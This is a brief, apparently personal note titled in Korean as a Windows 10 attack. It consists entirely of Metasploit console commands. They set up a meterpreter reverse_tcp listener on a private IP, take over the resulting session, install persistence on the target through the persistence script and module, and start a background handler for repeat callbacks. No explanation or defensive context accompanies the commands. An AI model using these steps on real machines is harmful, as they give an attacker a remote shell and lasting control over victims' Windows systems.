**w10공격**
```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.0.0.41
set lport 60060
run
background
sessions -l
sessions 1
run persistence
background
use exploit/windows/local/persistence


set session 1
set lport 60010
run
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
show options
show advanced #타겟쪽에 세부설정
set exitonsession false
set lport 60010
run -j
```
